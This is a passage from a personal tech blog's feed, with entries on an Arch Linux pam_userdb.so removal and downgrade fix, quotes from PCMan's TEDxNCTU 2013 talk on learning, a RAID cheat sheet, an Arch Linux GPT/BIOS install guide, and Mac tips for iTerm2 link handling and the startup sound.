&lt;p&gt;進 &lt;code&gt;/usr/lib/security&lt;/code&gt; 裡查看，發現 &lt;code&gt;pam_userdb.so&lt;/code&gt; 消失了  &lt;/p&gt;
&lt;p&gt;推測問題出在這，到 Google 丟了 &lt;code&gt;/usr/lib/security/pam_userdb.so&lt;/code&gt; 進行搜尋  &lt;/p&gt;
&lt;p&gt;查到這兩篇文章  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://bbs.archlinux.org/viewtopic.php?pid=1382541"&gt;pam_userdb.so gone after upgrading pam-1.1.8-2 -&amp;gt; pam-1.1.8-3&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://bugs.archlinux.org/task/38848"&gt;FS#38848 - [pam] /usr/lib/security/pam_userdb.so missing&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;原來是被移除掉了  &lt;/p&gt;
&lt;p&gt;從底下的回應看起來好像只看到 vsftpd 的 virtual user 功能受到影響  &lt;/p&gt;
&lt;p&gt;兩篇的回應都有人提到 &lt;code&gt;pam_pwdfile&lt;/code&gt; 這個套件，&lt;br /&gt;
不過是在 AUR 上而非官方套件，而且用的人好像有點少，所以不考慮。  &lt;/p&gt;
&lt;p&gt;目前的解法還是用  &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ sudo pacman -U /var/cache/pacman/pkg/pam-1.1.8-2-x86_64.pkg.tar.xz  
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;將 pam 先降級回 &lt;code&gt;pam 1.1.8-2&lt;/code&gt;  &lt;/p&gt;</summary><category term="Linux"></category><category term="Arch Linux"></category><category term="vsftpd"></category><category term="pam"></category><category term="sysadmin"></category></entry><entry><title>那些年，我們一起上的 BBS: 洪任諭(PCMan) 於 TEDxNCTU 2013</title><link href="https://blog.m157q.tw/posts/2014/01/14/pcman-speech-at-tedxnctu-2013/" rel="alternate"></link><published>2015-10-26T13:19:00+08:00</published><updated>2015-10-26T13:19:00+08:00</updated><author><name>m157q</name></author><id>tag:blog.m157q.tw,2014-01-14:posts/2014/01/14/pcman-speech-at-tedxnctu-2013/</id><summary type="html">&lt;p&gt;PCMan 2013/11/30 在新竹交通大學的演講  &lt;/p&gt;
&lt;h2&gt;影片&lt;/h2&gt;
&lt;iframe width="560" height="315" src="//www.youtube.com/embed/-tYj8QmyiCc" frameborder="0" allowfullscreen&gt;&lt;/iframe&gt;

&lt;h2&gt;逐字稿&lt;/h2&gt;
&lt;p&gt;&lt;a href="https://hackpad.com/-BBS--BqLE55Op9Lg"&gt;那些年，我們一起上的 BBS - 逐字稿: - hackpad.com&lt;/a&gt;  &lt;/p&gt;
&lt;hr /&gt;
&lt;p&gt;以下是我自己打的一些節錄，個人有稍微修改一些字詞，應該不致影響語意。  &lt;/p&gt;
&lt;p&gt;跟教育有關的部份真的是是心有戚戚焉啊...  &lt;/p&gt;
&lt;hr /&gt;
&lt;p&gt;「你知道素人跟專家最大的不同在哪裡嗎？&lt;br /&gt;
素人什麼都不會、什麼都不懂、什麼都沒有經驗&lt;br /&gt;
但是這並不是缺點，正因為素人什麼都不知道，&lt;br /&gt;
所以不知道有什麼困難，所以不會害怕困難&lt;br /&gt;
因為不知道要怕什麼，所以也什麼都不會怕，&lt;br /&gt;
所以不知不覺就把一件事給做完了&lt;br /&gt;
這是我在開發 PCMan 的時候所學到的」  &lt;/p&gt;
&lt;hr /&gt;
&lt;p&gt;「很多時候，問題不是我們學的東西不夠，而是我們學的東西太多了。&lt;br /&gt;
你受到太多的訓練，你受到太多的框架侷限。」  &lt;/p&gt;
&lt;hr /&gt;
&lt;p&gt;「學校教育的問題是，把太多的東西一次全部倒給你，然後分散在幾次期中考就考掉了。&lt;br /&gt;
學完這些東西以後，你一定會有個問題，我學這些東西要幹嘛？&lt;br /&gt;
我自己的學習方式是反過來的，我是先有問題，然後自己去找問題的答案。&lt;br /&gt;
最後也許我們學到的是一樣的東西，但是我的過程充滿樂趣，而你的卻會是充滿艱辛。」  &lt;/p&gt;
&lt;hr /&gt;
&lt;p&gt;「就好像你不會把整本英文字典都讀完才開始用英文，&lt;br /&gt;
你也不會把地圖全部背好了然後才出門，&lt;br /&gt;
你一定是遇到不會的，然後才去找答案，這其實是我們人類的本能，&lt;br /&gt;
可是我們的教育系統是反過來的，所以你要自己再把它顛倒回來。」  &lt;/p&gt;
&lt;hr /&gt;
&lt;p&gt;「光是只有動機是不夠的，不需要等你會了這個東西才去做，&lt;br /&gt;
因為世界上並沒有完美的的計畫，你可能計畫很久，然後怎麼想都有漏洞，&lt;br /&gt;
所以想到最後都沒有動手。其實，有些事是你做了之後才知道問題在哪裡的。&lt;br /&gt;
所以，稍微會一點就可以了，遇到不會的再查就好。&lt;br /&gt;
問題會一個一個慢慢的克服，我自己就是這樣走過來的。」  &lt;/p&gt;
&lt;hr /&gt;
&lt;p&gt;「學校其實還有另外一個問題，&lt;br /&gt;
就是大家都使用一樣的方法教學，教你一樣的東西，然後用一樣的方法評量。&lt;br /&gt;
而學生也只有分兩種，及格跟不及格。&lt;br /&gt;
不會有人在意你的個人特色和你到底會什麼東西，反正這套教材就塞給你了。」  &lt;/p&gt;
&lt;hr /&gt;
&lt;p&gt;「我們常常會笑韓國人喜歡整型，&lt;br /&gt;
不過，我問大家一個問題：&lt;br /&gt;
『你走在路上，看見整條街的人鼻子都一樣比較嚴重？還是腦子都一樣比較嚴重？』」  &lt;/p&gt;
&lt;hr /&gt;
&lt;p&gt;「你會想要怎樣與眾不同，不過這是個『假議題』。&lt;br /&gt;
其實從你在出生的那一刻起，你就跟別人不一樣了，你就與眾不同了，&lt;br /&gt;
只是我們在長大的過程中慢慢忘記了，所以今天把它想起來吧。」  &lt;/p&gt;
&lt;hr /&gt;
&lt;p&gt;「如果你有什麼想做但是沒有做的事，就動手去做吧，&lt;br /&gt;
其實沒有這麼困難，最困難的就是動手去做而已。&lt;br /&gt;
做的過程中遇到困難的話，再一個一個慢慢去查資料，其實你會克服的。」  &lt;/p&gt;
&lt;hr /&gt;
&lt;p&gt;「每個人都有一些他特別的地方，只是你要去把它找出來，&lt;br /&gt;
我們其實不需要兩千三百萬個考試第一名的人嘛，每個人應該有他自己的特色。」  &lt;/p&gt;
&lt;hr /&gt;
&lt;p&gt;「我在醫院每個月都會送走一些人，其中有一些是大老闆、有些人是總經理，&lt;br /&gt;
有一些甚至年紀比我小，他們最後散盡家財，可是連一個月的時間都買不到，&lt;br /&gt;
我相信他們在閉上眼睛之前，一定有一些事是想做但是沒有做的，&lt;br /&gt;
所以我後來有什麼想做的事，我就會不顧一切的去做，當然有時候還是會考慮一下。」  &lt;/p&gt;
&lt;hr /&gt;
&lt;p&gt;「有些事一開始看似很難，但其實你實際去做以後就會覺得沒有這麼難了。&lt;br /&gt;
這其實就很像溫水煮青蛙，最困難的步驟其實是抓青蛙，你只要把青蛙丟進去，&lt;br /&gt;
剩下的其實就是時間的問題了，所以不要害怕跨出第一步。」  &lt;/p&gt;
&lt;hr /&gt;
&lt;p&gt;「回想一下，你有沒有什麼一直想做，但沒有去做的事，&lt;br /&gt;
如果有的話，不要讓那些事等你太久。&lt;br /&gt;
而且事實上，能力不夠並不是問題。因為不會可以學，做了就會了。&lt;br /&gt;
所以很多事其實是需要你動手去做，而且是現在去做。&lt;br /&gt;
因為人生其實真的沒有那麼長。」  &lt;/p&gt;
&lt;hr /&gt;
&lt;p&gt;「如果你什麼都不會，你不用為此受到侷限。&lt;br /&gt;
因為你不是專家，所以你可以跳脫框架，你的思考不會受到傳統的規範，&lt;br /&gt;
有時候反而可以有所突破。」  &lt;/p&gt;
&lt;hr /&gt;
&lt;p&gt;「不管你喜不喜歡現在的工作和職業，&lt;br /&gt;
保有一個自己的興趣、發展自己的特色是很重要的，&lt;br /&gt;
如果你有自己的興趣的話，希望你不要放棄它，&lt;br /&gt;
永遠不要放棄一個讓自己與眾不同的機會，永遠。」  &lt;/p&gt;
&lt;hr /&gt;
&lt;h2&gt;Reference&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://gist.github.com/hychen/8389441"&gt;hychen 在 gist 上放的逐字稿&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;</summary><category term="PCMan"></category><category term="TEDxNCTU"></category><category term="Speech"></category></entry><entry><title>RAID Cheat Sheet</title><link href="https://blog.m157q.tw/posts/2014/01/12/raid-cheat-sheet/" rel="alternate"></link><published>2015-10-26T13:43:00+08:00</published><updated>2015-10-26T13:43:00+08:00</updated><author><name>m157q</name></author><id>tag:blog.m157q.tw,2014-01-12:posts/2014/01/12/raid-cheat-sheet/</id><summary type="html">&lt;h2&gt;Format of the note below&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;Type - Name  &lt;ul&gt;
&lt;li&gt;Minimum Disks (M)  &lt;/li&gt;
&lt;li&gt;Fault Tolerance Disks (F)  &lt;/li&gt;
&lt;li&gt;Attributes (A)  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;ul&gt;
&lt;li&gt;RAID0 - Non Redundant Striping  &lt;ul&gt;
&lt;li&gt;M: 2  &lt;/li&gt;
&lt;li&gt;F: 0  &lt;/li&gt;
&lt;li&gt;A: Block Level Striping  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;RAID1 - Mirrored Disks  &lt;ul&gt;
&lt;li&gt;M: 2  &lt;/li&gt;
&lt;li&gt;F: n-1  &lt;/li&gt;
&lt;li&gt;A: Mirroring  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;RAID2 - Memory Style Error Correcting Codes  &lt;ul&gt;
&lt;li&gt;M: 3  &lt;/li&gt;
&lt;li&gt;F: 1 (Can Recover)  &lt;/li&gt;
&lt;li&gt;A:  &lt;ul&gt;
&lt;li&gt;Bit Level Striping  &lt;/li&gt;
&lt;li&gt;Dedicated Hamming Code (Error Correction)  &lt;/li&gt;
&lt;li&gt;Recovery  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;RAID3 - Bit Interleaved Parity  &lt;ul&gt;
&lt;li&gt;M: 3  &lt;/li&gt;
&lt;li&gt;F: 1  &lt;/li&gt;
&lt;li&gt;A:  &lt;ul&gt;
&lt;li&gt;Bit Level Striping (Wikipedia said Byte Level)  &lt;/li&gt;
&lt;li&gt;Dedicated Parity Code (Error Detection)  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;RAID4 - Block Interleaved Parity  &lt;ul&gt;
&lt;li&gt;M: 3  &lt;/li&gt;
&lt;li&gt;F: 1  &lt;/li&gt;
&lt;li&gt;A:  &lt;ul&gt;
&lt;li&gt;Block Level Striping  &lt;/li&gt;
&lt;li&gt;Dedicated Parity Code (Error Detection)  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;RAID5 - Block Interleaved Distributed Parity  &lt;ul&gt;
&lt;li&gt;M: 3  &lt;/li&gt;
&lt;li&gt;F: 1  &lt;/li&gt;
&lt;li&gt;A:  &lt;ul&gt;
&lt;li&gt;Block Level Striping  &lt;/li&gt;
&lt;li&gt;Distributed Parity Code (Error Detection)  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;RAID6 - P + Q Redundancy  &lt;ul&gt;
&lt;li&gt;M: 4  &lt;/li&gt;
&lt;li&gt;F: 2  &lt;/li&gt;
&lt;li&gt;A:  &lt;ul&gt;
&lt;li&gt;Block Level Striping  &lt;/li&gt;
&lt;li&gt;Double Distributed Parity Code (Error Detection) aka &lt;a href="http://en.wikipedia.org/wiki/Reed%E2%80%93Solomon_error_correction"&gt;Reed-Solomon Code&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;RAID01 - RAID0 + RAID1  &lt;ul&gt;
&lt;li&gt;M: 4  &lt;/li&gt;
&lt;li&gt;F: ?  &lt;/li&gt;
&lt;li&gt;A: Striping First, then Mirroring.  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;RAID10 - RAID1 + RAID0  &lt;ul&gt;
&lt;li&gt;M: 4  &lt;/li&gt;
&lt;li&gt;F: ?  &lt;/li&gt;
&lt;li&gt;A: Mirroring First, then Striping.  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h2&gt;References&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://en.wikipedia.org/wiki/RAID"&gt;RAID - Wikipedia&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="http://en.wikipedia.org/wiki/Reed%E2%80%93Solomon_error_correction"&gt;Reed-Solomon Error Correction - Wikipedia&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;</summary><category term="RAID"></category><category term="Cheat Sheet"></category></entry><entry><title>Arch Linux Quick Installation with GPT in BIOS</title><link href="https://blog.m157q.tw/posts/2013/12/30/arch-linux-quick-installation-with-gpt-in-bios/" rel="alternate"></link><published>2015-10-27T19:08:00+08:00</published><updated>2015-10-27T19:08:00+08:00</updated><author><name>m157q</name></author><id>tag:blog.m157q.tw,2013-12-30:posts/2013/12/30/arch-linux-quick-installation-with-gpt-in-bios/</id><summary type="html">&lt;h2&gt;Preface&lt;/h2&gt;
&lt;p&gt;A quick installation based on &lt;a href="https://wiki.archlinux.org/index.php/Beginners'_Guide"&gt;Arch wiki - Beginners' Guide&lt;/a&gt;  &lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;WITHOUT NETWORK CONFIGURATION&lt;br /&gt;
(INSTALL IN VIRTUAL MACHINE USING DHCP).&lt;br /&gt;
YOU NEED TO SETUP THE NETWORK OF THE MACHINE FIRST.  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;hr /&gt;
&lt;h2&gt;Network&lt;/h2&gt;
&lt;p&gt;&lt;a href="https://wiki.archlinux.org/index.php/Network_configuration"&gt;Network configuration - ArchWiki&lt;/a&gt;  &lt;/p&gt;
&lt;hr /&gt;
&lt;h2&gt;Partition&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;# lsblk&lt;/code&gt;  &lt;ul&gt;
&lt;li&gt;Check you are partitioning on the right disk.  &lt;/li&gt;
&lt;li&gt;(assume &lt;code&gt;/dev/sda&lt;/code&gt; here)  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;code&gt;# cgdisk /dev/sda&lt;/code&gt;  &lt;ul&gt;
&lt;li&gt;Partition Table  &lt;ul&gt;
&lt;li&gt;GPT - &lt;code&gt;ef02&lt;/code&gt; (BIOS boot partition) =&amp;gt; &lt;code&gt;/dev/sda1&lt;/code&gt;  &lt;ul&gt;
&lt;li&gt;1M  &lt;/li&gt;
&lt;li&gt;MUST be the first partition of the disk.  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;IMPORTANT!! Set to BIOS Boot partition for grub2&lt;/code&gt;.  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;/ - 8300 (Linux filesystem) =&amp;gt; &lt;code&gt;/dev/sda2&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;swap - 8200 (Linux swap) =&amp;gt; &lt;code&gt;/dev/sda3&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;home - 8302 (Linux /home) =&amp;gt; &lt;code&gt;/dev/sda4&lt;/code&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Write -&amp;gt; yes  &lt;/li&gt;
&lt;li&gt;QUIT  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;code&gt;# lsblk&lt;/code&gt;  &lt;ul&gt;
&lt;li&gt;Check if the partition scheme of the disk is right.  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h2&gt;Create Filesystem&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;# mkfs.ext4 /dev/sda2&lt;/code&gt;  &lt;ul&gt;
&lt;li&gt;&lt;code&gt;ext4&lt;/code&gt; for &lt;code&gt;/&lt;/code&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;code&gt;# mkfs.ext4 /dev/sda4&lt;/code&gt;  &lt;ul&gt;
&lt;li&gt;&lt;code&gt;ext4&lt;/code&gt; for &lt;code&gt;home&lt;/code&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;code&gt;# mkswap /dev/sda3 &amp;amp;&amp;amp; swapon /dev/sda3&lt;/code&gt;  &lt;ul&gt;
&lt;li&gt;&lt;code&gt;swap&lt;/code&gt; for &lt;code&gt;swap&lt;/code&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;Mount partitionis&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;# mount /dev/sda2 /mnt&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;# mkdir /mnt/home &amp;amp;&amp;amp; mount /dev/sda4 /mnt/home&lt;/code&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;Select a mirror&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;# vi /etc/pacman.d/mirrorlist&lt;/code&gt;  &lt;ul&gt;
&lt;li&gt;Choose a mirror site that is the nearest from your machine  &lt;/li&gt;
&lt;li&gt;Copy it to the top of this mirrorlist.  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;Install the base system&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;# pacstrap /mnt base base-devel&lt;/code&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Generate fstab&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;# genfstab -p /mnt &amp;gt; /mnt/etc/fstab&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;# vi /mnt/etc/fstab&lt;/code&gt;  &lt;ul&gt;
&lt;li&gt;Check if the fstab is right.  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h2&gt;Chroot and configure the base system&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;# arch-chroot /mnt /bin/bash&lt;/code&gt;  &lt;ul&gt;
&lt;li&gt;After chroot, use bash.  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Locale &amp;amp; Keymap&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;# vi /etc/locale.gen&lt;/code&gt;  &lt;ul&gt;
&lt;li&gt;Select needed encoding and uncomment them.  &lt;/li&gt;
&lt;li&gt;en_US.UTF-8 UTF-8  &lt;/li&gt;
&lt;li&gt;zh_TW.UTF-8 UTF-8  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;code&gt;# locale-gen&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;# echo "LANG=en_US.UTF-8" &amp;gt; /etc/locale.conf&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;# echo "KEYMAP=us" &amp;gt; /etc/vconsole.conf&lt;/code&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Timezone &amp;amp; Hardclock &amp;amp; Hostname&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;# ln -s /usr/share/zoneinfo/Asia/Taipei /etc/localtime&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;# hwclock --systohc --utc&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;# echo "$myhostname" &amp;gt; /etc/hostname&lt;/code&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Configure the network (DHCP)&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;# systemctl enable dhcpcd.service&lt;/code&gt;  &lt;ul&gt;
&lt;li&gt;I use DHCP for the virtual machine.  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;For static IP  and wireless, Check the Official Guide  &lt;ul&gt;
&lt;li&gt;&lt;a href="https://wiki.archlinux.org/index.php/Network_configuration"&gt;Network configuration - ArchWiki&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Create an initial ramdisk environment&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;If you won't modify &lt;code&gt;/etc/mkinitcpio.conf&lt;/code&gt;, you can just skip this step.  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;# mkinitcpio -p linux&lt;/code&gt; after modified &lt;code&gt;/etc/mkinitcpio.conf&lt;/code&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Set User&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;# passwd&lt;/code&gt;  &lt;ul&gt;
&lt;li&gt;set root password.  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;code&gt;# useradd -m $user&lt;/code&gt;  &lt;ul&gt;
&lt;li&gt;add a user with home directory.  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;code&gt;# passwd $user&lt;/code&gt;  &lt;ul&gt;
&lt;li&gt;set the password for the user.  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h2&gt;Install and configure a bootloader&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;# pacman -S grub&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;# vi /etc/default/grub&lt;/code&gt;  &lt;ul&gt;
&lt;li&gt;&lt;a href="https://bugs.archlinux.org/task/38041?project=1&amp;amp;cat%5B0%5D=31&amp;amp;string=grub"&gt;For a bug of grub I've met&lt;/a&gt;.  &lt;/li&gt;
&lt;li&gt;Add &lt;code&gt;GRUB_DISABLE_SUBMENU=y&lt;/code&gt; at the end of &lt;code&gt;/etc/default/grub&lt;/code&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;code&gt;# grub-mkconfig -o /boot/grub/grub.cfg&lt;/code&gt;  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Generate the configuration file of grub  &lt;blockquote&gt;
&lt;p&gt;If you didn't add the &lt;code&gt;GRUB_DISABLE_SUBMENU=y&lt;/code&gt; mentioned above&lt;br /&gt;
you would get error message and fail here.  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;code&gt;# grub-install --target=i386-pc --recheck /dev/sda&lt;/code&gt;  &lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;If you didn't mark the GPT partition (1007KiB)&lt;br /&gt;
as a &lt;code&gt;BIOS Boot Partition&lt;/code&gt;&lt;br /&gt;
you would get error message and fail here.&lt;br /&gt;
the solution is in &lt;a href="https://wiki.archlinux.org/index.php/GRUB#Intel_BIOS_not_booting_GPT"&gt;GRUB - ArchWiki&lt;/a&gt;  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h2&gt;After installation&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;# exit&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;# umount -R /mnt&lt;/code&gt;  &lt;ul&gt;
&lt;li&gt;unmount the partitions  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;code&gt;# reboot&lt;/code&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h2&gt;References&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://wiki.archlinux.org/index.php/Beginners'_Guide"&gt;Arch wiki - Beginner's Guide&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://wiki.archlinux.org/index.php/GRUB#Intel_BIOS_not_booting_GPT"&gt;Arch wiki - GRUB - Intel BIOS not booting GPT&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://bbs.archlinux.org/viewtopic.php?id=173921"&gt;[solved] Grub Update gives Syntax error&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://bugs.archlinux.org/task/38041?project=1&amp;amp;cat%5B0%5D=31&amp;amp;string=grub"&gt;FS#38041 - grub 1:2.00.1282.g5ae5c54-1 will not generate grub.cfg file syntax errors&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="http://xatierlike.blogspot.tw/2012/10/archlinux-installation.html"&gt;Archlinux installation - xatierlike&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;</summary><category term="Linux"></category><category term="Arch Linux"></category><category term="Guide"></category><category term="GPT"></category><category term="BIOS"></category></entry><entry><title>iTerm2 搶走 https 連結預設開啟程式的解法</title><link href="https://blog.m157q.tw/posts/2013/12/10/change-the-default-application-for-https-url-in-iterm2-on-mac/" rel="alternate"></link><published>2015-10-26T13:47:00+08:00</published><updated>2015-10-26T13:47:00+08:00</updated><author><name>m157q</name></author><id>tag:blog.m157q.tw,2013-12-10:posts/2013/12/10/change-the-default-application-for-https-url-in-iterm2-on-mac/</id><summary type="html">&lt;p&gt;iTerm2 會搶走 https 的預設開啟應用程式&lt;br /&gt;
所以每次點 https 連結以後&lt;br /&gt;
就會在 iTerm2 開一個新分頁 然後啥都沒有&lt;br /&gt;
http 連結就不會有這個問題  &lt;/p&gt;
&lt;p&gt;google 了好久 終於找到這篇&lt;br /&gt;
&lt;a href="http://www.macuknow.com/node/20369"&gt;MacUknow - 請問關於https連結預設開啟程式&lt;/a&gt;&lt;br /&gt;
國外好像都沒人遇到 不然就是我 google searching skill 太差  &lt;/p&gt;
&lt;hr /&gt;
&lt;h3&gt;解法&lt;/h3&gt;
&lt;p&gt;在 terminal 輸入  &lt;/p&gt;
&lt;p&gt;&lt;code&gt;open ~/Library/Preferences/com.apple.LaunchServices.plist&lt;/code&gt;  &lt;/p&gt;
&lt;p&gt;預設會用 Xcode 開啟&lt;br /&gt;
一個個點開檢查 &lt;code&gt;LSHandlers&lt;/code&gt; 底下的某個 Item&lt;br /&gt;
看到 &lt;code&gt;LSHandlerURLScheme https&lt;/code&gt; 後&lt;br /&gt;
把底下的 &lt;code&gt;LSHandlerRoleAll&lt;/code&gt; 改成 &lt;code&gt;com.google.chrome&lt;/code&gt;  &lt;/p&gt;
&lt;p&gt;確認修改完之後重新開機&lt;br /&gt;
點選 https 應該就會改回用 Chrome 開啟了  &lt;/p&gt;</summary><category term="Mac"></category><category term="HTTPS"></category><category term="iTerm2"></category></entry><entry><title>Disable Startup Sound of a Mac</title><link href="https://blog.m157q.tw/posts/2013/11/06/disable-startup-sound-of-a-mac/" rel="alternate"></link><published>2013-11-06T07:30:00+08:00</published><updated>2013-11-06T07:30:00+08:00</updated><author><name>m157q</name></author><id>tag:blog.m157q.tw,2013-11-06:posts/2013/11/06/disable-startup-sound-of-a-mac/</id><summary type="html">&lt;p&gt;The startup sound of Mac won't disappear if I mute the speaker.&lt;br /&gt;
The startup sound just annoys me, so I wanna disable it.  &lt;/p&gt;
&lt;hr /&gt;
&lt;h2&gt;Disable startup sound&lt;/h2&gt;
&lt;p&gt;&lt;code&gt;$ sudo nvram SystemAudioVolume=%80&lt;/code&gt;  &lt;/p&gt;
&lt;p&gt;It should work.  &lt;/p&gt;
&lt;hr /&gt;
&lt;h2&gt;Enable startup sound again&lt;/h2&gt;
&lt;p&gt;To enable the startup sound  &lt;/p&gt;
&lt;p&gt;&lt;code&gt;sudo nvram -d SystemAudioVolume&lt;/code&gt;  &lt;/p&gt;
&lt;hr /&gt;
&lt;p&gt;Just still don't know why &lt;code&gt;%80&lt;/code&gt; O_o?  &lt;/p&gt;
&lt;hr /&gt;
&lt;h2&gt;References&lt;/h2&gt;
&lt;p&gt;&lt;a href="http://www.cultofmac.com/200772/silence-your-mac-boot-startup-sound-altogether-os-x-tips/"&gt;Silence Your Mac Boot Startup Sound Altogether [OS X Tips]&lt;/a&gt;  &lt;/p&gt;</summary><category term="OS X"></category><category term="Mac"></category><category term="Startup Sound"></category></entry><entry><title>Mount Windows NTFS filesystem on Mac OSX</title><link href="https://blog.m157q.tw/posts/2013/11/03/mount-windows-ntfs-filesystem-on-mac-osx/" rel="alternate"></link><published>2013-11-03T11:50:00+08:00</published><updated>2013-11-03T11:50:00+08:00</updated><author><name>m157q</name></author><id>tag:blog.m157q.tw,2013-11-03:posts/2013/11/03/mount-windows-ntfs-filesystem-on-mac-osx/</id><summary type="html">&lt;p&gt;Today, I tried to retrieve datas stored in my USB 2.0 external hard drive.&lt;br /&gt;
